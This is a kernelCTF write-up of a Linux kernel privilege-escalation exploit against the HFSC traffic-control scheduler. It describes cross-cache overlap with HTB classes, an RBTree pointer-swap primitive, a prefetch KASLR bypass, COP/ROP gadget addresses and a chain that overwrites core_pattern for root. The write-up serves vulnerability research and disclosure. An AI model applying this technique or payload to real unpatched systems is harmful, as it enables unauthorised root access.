# Attacking Objects

- **Victim Object**: `hfsc_class`
- **Attacking Object**: `htb_class`
- **Primitive**: RBTree pointer swap primitive, used to overwrite `htb->leaf.q` (Qdisc) with `&htb->ceil.rate_bytes_ps - 8` and fake `htb->leaf.q->dequeue()` with `htb->ceil.rate_bytes_ps`

# TL;DR

- Use a prefetch sidechannel to bypass KASLR and leak the `cpu_entry_area` address (this is randomized in mitigation-v4)
- Exploit multiple RBTree transformations to swap the `htb->leaf.q` (Qdisc) pointer of a `htb_class` object with `&htb->ceil.rate_bytes_ps - 8`, then fake `htb->leaf.q->dequeue()` controlling `htb->ceil.rate_bytes_ps` and use two COP gadgets to stack pivot into `cpu_entry_area`
- Overwrite `core_pattern` and trigger a segmentation fault to read the flag 

# Vulnerability Analysis

For the vulnerability analysis, please refer to `vulnerability.md`.

# Overview

Unlike the LTS/COS exploit, here we cannot use `pgv` to exploit the vulnerability, as `hfsc_class` objects and `pgv` are allocated in different caches.

As [previously documented](https://sam4k.com/exploring-linux-random-kmalloc-caches/), [Kmalloc Random Caches](https://lwn.net/Articles/938246/) rely on `_RET_IP_` to generate the hash used to determine the destination cache. 

However, sometimes `kmalloc` and similar calls are inlined, resulting in multiple objects being allocated in the same cache.

This is the case for `hfsc_class` and `htb_class`, both allocated in the same `kmalloc-rnd-N-1k` cache.

Traffic control classes are allocated by their `change()` handler. This is called by `tc_ctl_tclass()`:

```c
static int tc_ctl_tclass(struct sk_buff *skb, struct nlmsghdr *n,
			 struct netlink_ext_ack *extack)
{
    // ...

	if (cops->change)
		err = cops->change(q, clid, portid, tca, &new_cl, extack); // ***
	if (err == 0) {
		tclass_notify(net, skb, n, q, new_cl, RTM_NEWTCLASS, extack);
		/* We just create a new class, need to do reverse binding. */
		if (cl != new_cl)
			tc_bind_tclass(q, portid, clid, new_cl);
	}

    // ...
}
```

Since all `change()` handlers share the same caller, if the `k*alloc()` calls used to allocate the structures are inlined, this will result in multiple classes being allocated in the same cache.

Luckily for us, in `hfsc_change_class()`, the [kzalloc() call](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_hfsc.c#L1039) used to allocate the class is inlined:

```c
   // disass hfsc_change_class
   ...
   0xffffffff820f0ead <+429>:	mov    rax,QWORD PTR [rsp+0x98]             // rax = stored _RET_IP_ (0xffffffff820d993b)
   0xffffffff820f0eb5 <+437>:	xor    rax,QWORD PTR [rip+0x12aa45c]        # 0xffffffff8339b318 <random_kmalloc_seed>
   0xffffffff820f0ebc <+444>:	mov    esi,0xdc0
   0xffffffff820f0ec1 <+449>:	movabs rdx,0x61c8864680b583eb
   0xffffffff820f0ecb <+459>:	imul   rax,rdx
   0xffffffff820f0ecf <+463>:	shr    rax,0x3c
   0xffffffff820f0ed3 <+467>:	lea    rdx,[rax*8+0x0]
   0xffffffff820f0edb <+475>:	sub    rdx,rax
   0xffffffff820f0ede <+478>:	mov    rax,rdx
   0xffffffff820f0ee1 <+481>:	mov    edx,0x2f0
   0xffffffff820f0ee6 <+486>:	shl    rax,0x4
   0xffffffff820f0eea <+490>:	mov    rdi,QWORD PTR [rax-0x7cc64c90]
   0xffffffff820f0ef1 <+497>:	call   0xffffffff813f7080 <kmalloc_trace>
   ...
```

And [the same](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_htb.c#L1848) is true for `htb_change_class()`:

```c
   // disass htb_change_class
   ...
   0xffffffff820ee15b <+1387>:	mov    rax,QWORD PTR [rsp+0x120]            // rax = stored _RET_IP_ (0xffffffff820d993b)
   0xffffffff820ee163 <+1395>:	mov    esi,0xdc0
   0xffffffff820ee168 <+1400>:	mov    QWORD PTR [rsp+0x30],r10
   0xffffffff820ee16d <+1405>:	movabs rdx,0x61c8864680b583eb
   0xffffffff820ee177 <+1415>:	xor    rax,QWORD PTR [rip+0x12ad19a]        # 0xffffffff8339b318 <random_kmalloc_seed>
   0xffffffff820ee17e <+1422>:	imul   rax,rdx
   0xffffffff820ee182 <+1426>:	shr    rax,0x3c
   0xffffffff820ee186 <+1430>:	lea    rdx,[rax*8+0x0]
   0xffffffff820ee18e <+1438>:	sub    rdx,rax
   0xffffffff820ee191 <+1441>:	mov    rax,rdx
   0xffffffff820ee194 <+1444>:	mov    edx,0x300
   0xffffffff820ee199 <+1449>:	shl    rax,0x4
   0xffffffff820ee19d <+1453>:	mov    rdi,QWORD PTR [rax-0x7cc64c90]
   0xffffffff820ee1a4 <+1460>:	call   0xffffffff813f7080 <kmalloc_trace>
   ...
```

The `_RET_IP_` used for both allocations is in `tc_ctl_tclass()`, so these two fixed-sized objects, 752 bytes for HFSC and 768 bytes for HTB, are both allocated in `kmalloc-rnd-N-1k`:

```c
gefâž¤  p $rax
$1 = 0xffffffff820d993b
gefâž¤  x/10i 0xffffffff820d993b
   0xffffffff820d993b <tc_ctl_tclass+411>:	nop    DWORD PTR [rax]
   0xffffffff820d993e <tc_ctl_tclass+414>:	mov    r11,QWORD PTR [rsp+0x10]
   0xffffffff820d9943 <tc_ctl_tclass+419>:	test   eax,eax
   0xffffffff820d9945 <tc_ctl_tclass+421>:	mov    r10d,eax
   0xffffffff820d9948 <tc_ctl_tclass+424>:	jne    0xffffffff820d99e0 <tc_ctl_tclass+576>
   0xffffffff820d994e <tc_ctl_tclass+430>:	mov    r8,QWORD PTR [rsp+0x28]
   0xffffffff820d9953 <tc_ctl_tclass+435>:	mov    rdi,QWORD PTR [rsp]
   0xffffffff820d9957 <tc_ctl_tclass+439>:	mov    rdx,rbx
   0xffffffff820d995a <tc_ctl_tclass+442>:	mov    r9,rbp
   0xffffffff820d995d <tc_ctl_tclass+445>:	mov    rcx,r11
```

## RBTree Pointer Swap Primitive

The first thing that can be noticed analyzing the `hfsc_class` and `htb_class` structures,
is that the `hfsc->qdisc` pointer (offset 0x98) perfectly overlaps with `htb->bstats.packets`, a u64 value.

So, a possible strategy would involve sending about eighteen quintillion packets to the HTB class to fake an `hfsc->qdisc` pointer and hijack control flow when `hfsc->qdisc->enqueue()/dequeue()` are called.

Unfortunately. Time. Exists.

Returning to the realm of real possibilities, after attempting a couple of other approaches, I decided to use another RBTree attack. 

In the mitigation instance v4, the `hfsc->el_node.rb_left` pointer (offset 0xb0) overlaps with `htb->xstats.lends` and `htb->xstats.borrows`, two u32 variables.

```
# HFSC class offsets
hfsc->el_node.__rb_parent_color = 0xa0
hfsc->el_node.rb_right = 0xa8
hfsc->el_node.rb_left = 0xb0 ***

# HTB class offsets
htb->xstats.lends = 0xb0 ***
htb->xstats.borrows = 0xb4 ***
```

This allow us to:

1. Leak the overlapped `rb_node` pointer by dumping the HTB class xstats (essentialy `tc -s class show ...`)
2. Increment the `rb_node` pointer by sending packets to the interface

Point two is the most interesting part. Every time a packet is sent to a specific HTB class, the [htb->xstats.lends field is incremented by one](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_htb.c#L709), similar to the `htb->bstats.packets` field. 

If the lower 4 bytes of `hfsc->el_node.rb_left` are overlapped with `htb->xstats.lends`, we can indirectly increment the node pointer by sending packets to the interface. We will refer to the incremented pointer as F.

>Before proceeding, let's recall the offsets in a `rb_node` structure, 0x0 for `__rb_parent_color`, 0x8 for `rb_right` and 0x10 for `rb_left`:
>
>```c
>struct rb_node {
>    unsigned long  __rb_parent_color; // 0x0
>    struct rb_node *rb_right;         // 0x8
>    struct rb_node *rb_left;          // 0x10
>} __attribute__((aligned(sizeof(long))));
>```
>
>Basically, if we create a fake `rb_node` setting its address to `target - 0x10`, it means that `*target` will correspond to the fake node's `rb_left` pointer.

We can make F point 8 bytes before `htb->ceil.rate_bytes_ps` (u64, offset 0x30 in `htb_class`) of the next HTB class in memory. 

We have [full control](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_htb.c#L1816) over this qword (as well as over `htb->rate.rate_bytes_ps`, u64, offset 0x18 in `htb_class`, but this will be utilized later), so we can fake a `rb_right` child node for F (offset 8). We will refer to this child node as Q.

We make Q point 0x10 bytes before `htb->leaf.q` (the leaf `Qdisc` pointer, offset 0x100 within `htb_class`), so that `htb->leaf.q` becomes the Q's `rb_left` child. We refer to this Qdisc pointer (our target) as T.

At this point we have two layers of fake nodes, F, the incremented pointer, and Q, F's right child forged by controlling `htb->ceil.rate_bytes_ps`. T, is our target, `htb->leaf.q`, a pointer to the leaf `Qdisc` structure.

Our goal is to trigger some RBTree transformations to swap T, Q's `rb_left` child (the leaf Qdisc pointer) with `F`. 

```
F = Incremented pointer, points to `&htb->ceil.rate_bytes_ps - 8`
Q = &htb->leaf.q - 0x10
T = htb->leaf.q

    ...
    /
    F                                      ...
    \                                       \
     Q             ---- swap --->            Q
     /                                       /
    T                                       F   (F now overlaps with htb->leaf.q)
```


Since we control a qword at `[F + 8]` (`htb->ceil.rate_bytes_ps`), and the second qword in T (a Qdisc object) corresponds to the [dequeue()](https://elixir.bootlin.com/linux/v6.6.90/source/include/net/sch_generic.h#L76) function pointer, by overwriting `htb->leaf.q` with F, we can fake a `dequeue()` handler using a [COP](https://link.springer.com/article/10.1007/s11416-017-0299-1) gadget.

To sum it up, we need to:
- Overlap  `htb->xstats.lends` and `htb->xstats.borrows` with `hfsc->el_node.rb_left`
- Dump the class xstats to leak the `rb_left` pointer
- Increment `htb->xstats.lends` by sending packets to the interface to make the node pointer point 8 bytes before the `htb->ceil.rate_bytes_ps` user-controlled field (u64) of the next qdisc in memory
- Modify `htb->ceil.rate_bytes_ps` to fake a `rb_right` node which points 0x10 bytes before a `htb->leaf.q` Qdisc.
- Trigger multiple RBTree transformations to swap T with F
- Fake a `dequeue()` function pointer by modifying the qword at `[F + 0x8]`, `htb->ceil.rate_bytes_ps`, and hijack control flow when the function is called

A walk in the park, basically.

# Exploit Analysis

**@step(0): Prefetch sidechannel**

The exploit requires a KASLR and `cpu_entry_area` leak. In the mitigation-v4 instance, the [cpu_entry_area offset is randomized](https://elixir.bootlin.com/linux/v6.6/source/arch/x86/mm/cpu_entry_area.c#L46). However it is possible to utilize a prefetch sidechannel to derive the address.

By relying on a slightly modified version of [Will's prefetch implementation](https://www.willsroot.io/2023/08/sysruption.html) (we only need to remove the syscall), we can leak the address with very high accuracy - about 100% on my local machine and close to 90% on the remote mitigation instance. All of this in less than 10 seconds.

**@step(1): Initialization**
 
Similar to the LTS/COS exploit, we begin by initializing the required network interfaces, and qdiscs.
TBF is configured with a very low rate, ensuring that after sending some packets to the qdisc, it will run out of tokens and reschedule itself for later.
As result, the interface will be unable to dequeue packets until we reconfigure it.

Finally we proceed to saturate `kmalloc-rnd-N-1k` partial slabs, the cache where both `hfsc_class` and `htb_class` are allocated.

**@step(2): Prepare the memory layout**

We prepare the memory layout ensuring that the victim HFSC class is "surrounded" by HTB classes in its slab. This will be useful later, as we will work with relative offsets between objects.

We proceed with the allocations of the other HFSC classes that will be inserted in the HFSC eligible tree later.

**@step(3): Prepare the tree layout and trigger the vulnerability**

In this step, we prepare the tree layout by inserting four classes into the eligible tree. When class 2:1 is added, since its leaf qdisc is NETEM, the vulnerability is triggered resulting in the class being inserted twice in the tree.

This is the RBTree now:

```
                   2:3 
                   / \
                2:2   2:4
                       \
                        2:1
                        /
                      2:1 (Dupe)
```

**@step(4): Overwrite the hfsc_class 2:1 with a htb_class**

Now we free class 2:1. It remains accessible in the tree. We then replace the freed object with a HTB class, 1:2.

```
                   2:3 
                   / \
                2:2   2:4
                       \
                        1:2 (2:1 replaced by a HTB class object)
```

**@step(5): Delete class 2:4 from the tree**

Remember that our first goal is to overlap `hfsc->el_node.rb_left` with `htb->xstats.lends` and `htb->xstats.borrows`.

To achieve this, we need to trigger a tree rebalance, so that class 1:2 can become the root node, and its `rb_left` and `rb_right` children populated by class 2:3 and 2:2.

First, we delete node 2:4 from the tree.

This will trigger the following chain of calls in kernel-space: `hfsc_delete_class() -> qdisc_purge_queue() -> qdisc_tree_reduce_backlog() -> hfsc_qlen_notify() -> eltree_remove() -> rb_erase() -> __rb_erase_augmented()`

```
                   2:3 
                   / \
                2:2   x (2:4 is deleted)
                       \
                        1:2 (HTB)
```

After the deletion:

```    
                   2:3 
                   / \          
                2:2   1:2 (HTB)
```

**@step(6): Trigger a tree update so 1:2 is promoted to root node and leak class 2:3**

Now by triggering a tree update, the following functions are called by the kernel: `hfsc_change_class() -> update_el() -> eltree_update()`. `eltree_update()` relies on `eltree_remove()` and `eltree_insert()` to remove and re-insert the class in the tree.

First class 2:2 is removed:

```
                   2:3 
                   / \          
                  x   1:2 (HTB)
```

Then it is re-inserted:

```
                   2:3 
                     \          
                      1:2 (HTB)
                       \
                        2:2
```

And the tree rebalanced in `__rb_insert()`. In this function, the [first branch](https://elixir.bootlin.com/linux/v6.6/source/lib/rbtree.c#L116) (`parent != gparent->rb_right`) is taken and then [case 3 is resolved](https://elixir.bootlin.com/linux/v6.6/source/lib/rbtree.c#L167) (right rotate at gparent), resulting in the following tree configuration:

``` 
                   1:2 (HTB) now it is the root node
                   / \
                2:3   2:2
```

After the rotation, the HTB class (1:2) becomes the root node and class 2:3 and 2:2 its children. Now `hfsc->el_node.rb_left` of class 2:3 overlaps with `htb->xstats.lends` and `htb->xstats.borrows` of class 1:2.

We can easily leak this pointer by dumping the HTB class's xstats.

**@step(7): Increment the class 2:3 pointer by sending packets to the interface**

Now the fun part begins.

By sending packets to the HTB 1:2 class, we can indirectly increment the overlapped class 2:3 node pointer (1:2's `rb_left`). We refer to the incremented pointer as F.

We make it point 8 bytes before the `htb->ceil.rate_bytes_ps` field of the next qdisc in memory (remember that the slab is saturated with HTB classes):

```
                   1:2 (HTB)
                   /  \
                  F*  2:2
                   \
        0xc1cc10be110
```

Since F points 8 bytes before `htb->ceil.rate_bytes_ps`, and we have full control over this u64 field, we can fake a `rb_right` child node for F.

```c
gefâž¤  x/4gx 0xfffffe8804a0c828 // F (htb_class + 0x28)
0xfffffe8804a0c828:	0x0000000000002200	0x00000c1cc10be110 [1]
0xfffffe8804a0c838:	0x000000000013af18	0x0000000000002200
```

As can be observed in GDB, `htb->ceil.rate_bytes_ps`, F's `rb_right` child, contains a temporary placeholder, `0xc1cc10be110`.

**@step(8): Modify htb->ceil.rate_bytes_ps to fake a rb_right node for class 2:3 (F)**

In this step, we first add node 2:5. This will also set the node F parent (via the [else branch](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L183), [case 1](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L186) in `__rb_insert()`)


```
                   1:2 (HTB)
                  /  \
                 F*   2:2
                 \     \
       0xc1cc10be110    2:5

```

This is confirmed by analyzing the address of node E in GDB:

```c
gefâž¤  x/4gx 0xfffffe8804a0c828 // F (htb_class + 0x28)
0xfffffe8804a0c828:	0xfffffe8804a5f0a1***  	0x00000c1cc10be110
0xfffffe8804a0c838:	0x000000000013af18	   0x0000000000002200
```

Now by modifying `htb->ceil.rate_bytes_ps`, we can fake a `rb_right` child for F. We refer to this node as Q:

``` 
                   1:2 (HTB)
                   /  \
                  F    2:2
                  \     \
                  Q*     2:5
                  /
                 T
```

We set the address of Q to `&htb->leaf.q - 0x10`, in other words, 0x10 bytes before the leaf Qdisc pointer (T). This way, the qdisc pointer will be considered Q's `rb_left` child:

```c
gefâž¤  x/4gx 0xfffffe8804a0c828 // F (htb_class + 0x28)
0xfffffe8804a0c828:	0x0000000000002200	0xfffffe8804a0ccf0***
0xfffffe8804a0c838:	0x0000000000000000	0x0000000000002200
```

```c
gefâž¤  x/4gx 0xfffffe8804a0ccf0 // Q (&htb->leaf.q - 0x10)
0xfffffe8804a0ccf0:	0x0000000000000000	0x0000000000000000
0xfffffe8804a0cd00:	0xfffffe8804a14000	0x0000000000000000
   // This is htb->leaf.q (T) ---^
```

**@step(9): Delayed trigger, increase TBF rate and send packets to all htb classes**

Currently, the TBF rate is too low, preventing the interface from dequeuing packets. By modifying it and setting it to a slightly higher value, packets will be dequeued within a couple of seconds.

This step is necessary because in the next stage, we are going to overwrite `htb->leaf.q` (the HTB class leaf qdisc pointer). Once this pointer is overwritten by F, we can only control the second qword (`htb->ceil.rate_bytes_ps`, which overlaps with `q->dequeue()`).

What we cannot control is the first qword in F, which overlaps with `q->enqueue()`. Therefore, we need packets to be enqueued before the pointer is replaced to avoid an invalid pointer access when `htb->leaf.q->enqueue()` is called.

**@step(10): Trigger tree rebalance by deleting 2:5 and 2:2**

Now, we delete class 2:5 and 2:2 from the tree:

```
                   1:2 (HTB)
                   / \
                  F   2:2
                  \    \
                   Q    x (2:5 deleted)
                  /
                 T
```

```
                   1:2 (HTB)
                   / \
                  F   x (2:2 deleted)
                  \       
                   Q
                  /
                 T
``` 

When 2:2 is deleted, the [first branch](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L241) (`node != sibling`) is taken in [__rb_erase_color()](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L227).

First, [case 1](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L244) is resolved (right rotate at parent), followed by the resolution of [case 4](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L331) (right rotate at parent + color flips).

This results in the following tree configuration, where class 1:2 becomes Q's `rb_right` child:

``` 
                     F
                     \
                      Q
                     / \
                    T   1:2
```

**@step(11): Trigger a new rebalance by adding 2:6, 2:7, 2:8**

This is the last step. We add class 2:6:

``` 
                     F
                     \
                      Q
                     / \
                    T   1:2
                          \
                           2:6
    
```

Then class 2:7:

```
                     F
                     \
                      Q
                     / \
                    T   2:6
                        / \
                     1:2   2:7
```

And class 2:8. By adding this class, the tree is rebalanced in `__rb_insert()`.
The [else branch](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L183) is taken, and [case 1](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L186) is resolved.
The [loop continues](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L192), the [else branch](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L183) is taken again, and finally [case 3](https://elixir.bootlin.com/linux/v6.6.90/source/lib/rbtree.c#L210) is resolved (left rotate grandparent), exactly what we wanted. 

Now F and T are swapped:

```
                    Q
                   / \
                  F   2:6    
                      / \
                    1:2  2:7
                          \
                           2:8
``` 

The last RBTree transformation allowed us to overwrite `htb->leaf.q` (Qdisc pointer) with F.

**@step(12): Replace htb->rate.rate_bytes_ps with CEA base, ceil with a COP gadget**

In this step, we can fake a `dequeue()` handler using a COP gadget, since we control F's second qword (`htb->ceil.rate_bytes_ps`):


```
                    Q
                   /  \
                  F    ...   
                   \   
                    COP_GADGET_1 (Fake htb->leaf.q->dequeue())
```

Now, we just need to wait for the packets sent in step 9 to be dequeued.

When the TBF watchdog time fires, and the first COP gadget is executed, `R14` contains the address of the current HTB class.
`[R14 + 0x18]` corresponds to `htb->rate.rate_bytes_ps`, a user-controllable u64 value.

We set it to the address of `cpu_entry_area`. Our second COP gadget is placed 0x20 bytes within CEA.

With the first COP gadget, first `RAX` is set to `[CEA + 0x28]` (the address of the second COP gadget). Then the CEA address is moved in `RDI`. Finally `RAX` is called, and the second COP gadget executed.

```c
// COP gadget 1: [R14+0x18] R14 == htb_class addr, [R14+0x18] == htb_class->rate.rate_bytes_ps aka CEA
// 
// ffffffff8124d7de:    mov    rax,QWORD PTR [r14+0x18] // RAX = CEA
// ffffffff8124d7e2:    mov    rax,QWORD PTR [rax+0x28] // RAX = [CEA + 0x28] (COP gadget 2)
// ffffffff8124d7e6:    test   rax,rax
// ffffffff8124d7e9:    je     0xffffffff8124d875       // JMP not taken
// ffffffff8124d7ef:    mov    rcx,QWORD PTR [rsp+0x8]
// ffffffff8124d7f4:    xor    edx,edx
// ffffffff8124d7f6:    mov    esi,ebx
// ffffffff8124d7f8:    mov    rdi,r14                  // RDI = CEA
// ffffffff8124d7fb:    call   0xffffffff82484e80       // call RAX (COP gadget 2)
//
#define COP_GADGET_1 0xffffffff8124d7de
```

When the second COP gadget is executed, `RDI` contains the CEA address. First, `RBP` is populated with the address of `CEA + 0x8`, which will serve as new kernel stack. `RAX` is then set to `[CEA + 0x30]`, a leave ret gadget.

When `RAX` is called, the leave gadget is executed allowing us to stack pivot into CEA.

```c
// COP gadget 2: RDI == htb_class addr, [RDI+0x18] == htb_class->rate.rate_bytes_ps aka CEA
//
// ffffffff820d6375:    push   rbp
// ffffffff820d6376:    push   rbx
// ffffffff820d6377:    mov    rax,QWORD PTR [rdi+0x18] // RAX = CEA
// ffffffff820d637b:    mov    rbp,QWORD PTR [rax+0x8]  // RBP = [CEA + 0x8] = CEA + 0x8 (points to itself)
// ffffffff820d637f:    test   rbp,rbp
// ffffffff820d6382:    je     0xffffffff820d63a6       // JMP not taken
// ffffffff820d6384:    mov    rax,QWORD PTR [rbp+0x28] // RAX =  (CEA + 0x8) + 0x28 = CEA + 0x30 = LEAVE_RET gadget
// ffffffff820d6388:    mov    rbx,rdi
// ffffffff820d638b:    call   0xffffffff82484e80       // call RAX (LEAVE_RET gadget)
//
#define COP_GADGET_2 0xffffffff820d6375
```

The second stage of the ROP-chain is straightforward:

```c
    // Stage 2: Overwrite core_pattern
    cea_payload[2]  = kbase + POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET;
    cea_payload[3]  = kbase + CORE_PATTERN;
    cea_payload[4]  = CEA_OFFSET(cea_base) + 0x60;
    // ... [5]
    // ... [6]
    cea_payload[7]  = kbase + POP_RCX_RET;
    cea_payload[8]  = EVIL_CORE_PATTERN_LEN;
    cea_payload[9]  = kbase + REP_MOVS_BYTE_PTR_RDI_BYTE_PTR_RSI_RET;
    cea_payload[10] = kbase + DO_IDLE;
    cea_payload[11] = kbase + INFINITE_LOOP;
```

First `core_pattern` is set to `|/proc/%P/exe`, so the exploit binary is launched with root privileges when a segmentation fault is triggered. 

The rest of the ROP chain only consists of a `do_idle()` call followed by an infinite loop gadget used to hang the kernel thread that called `dequeue()`.

## Additional Notes

While the LTS/COS exploit only requires two RBTree transformations to achieve a pointer copy primitive, this exploit is much more complicated. To facilitate debugging of the RBTree states, I have written a simple GDB plugin specifically for this vulnerability to inspect the HFSC eligible tree.

**Example:**

We want to verify the state of the tree after the `rb_node` pointer is incremented in `@step(7)`.
To do this, we add a `getchar()` after `send_packets("dummy-1", 64, ptr_increment, TC_H(1, 2));`, then:

- Import the plugin: `source path/to/gdb-rbtree.py`
- Attach GDB
- In GDB: `b init_ed`, then `c`
- Run the exploit
- The breakpoint is hit
- In GDB: `set $sch=cl->sched`
- Detach GDB
- Now the `getchar()` part is reached in the exploit
- Reattach GDB
- In GDB: `prbtree $sch->eligible->rb_node`

```
gefâž¤  prbtree $sch->eligible->rb_node
[Root] ID: 1:2, Addr: 0xfffffe8804a320a0 (color=âš«), Parent: 0x1, Right: 2:2, Left: F
   [R] ID: 2:2, Addr: 0xfffffe8804a190a0 (color=ðŸ”´), Parent: 1:2, Right: -, Left: -
      [R] -
      [L] -
   [L] ID: F, Addr: 0xfffffe8804a01828 (color=ðŸ”´), Parent: 0x2200, Right: 0xc1cc10be110, Left: 0x13af18
      [R] -
      [L] -
```

```
gefâž¤  x/10gx 0xfffffe8804a01828 // F
0xfffffe8804a01828:	0x0000000000002200	0x00000c1cc10be110
0xfffffe8804a01838:	0x000000000013af18	0x0000000000002200
```

We compare the result above with the diagram in the exploit/exploit writeup, and we can confirm that the RBTree state corresponds to:

```
                   1:2 (HTB)
                   /  \
                  F*  2:2
                   \
        0xc1cc10be110
```

This exploit demonstrates that even partial control over an RBNode structure can enable very powerful primitives.

---

The exploit stability is around 90% on my local system and approximately 70-80% on the remote kernelCTF instance.

The pointer increment stage requires accessing the next object in memory in a kmalloc-1k slab. According to `/proc/slabinfo`, these slabs contain 16 objects. If guard pages are enabled and the victim object is the last object in the page, this will cause an invalid pointer access with a 1/16 probability, decreasing exploit reliability.

Another factor that affects stability is the prefetch side channel. By tweaking `KASLR_THRESHOLD` and `CEA_THRESHOLD`, it is possible to achieve better results on the remote instance.

On the CI, we will likely rely on `requires_separate_kaslr_leak` to disable KASLR. Based on other submissions, we can infer that the instance utilizes an AMD CPU, which can make the CEA prefetch problematic.
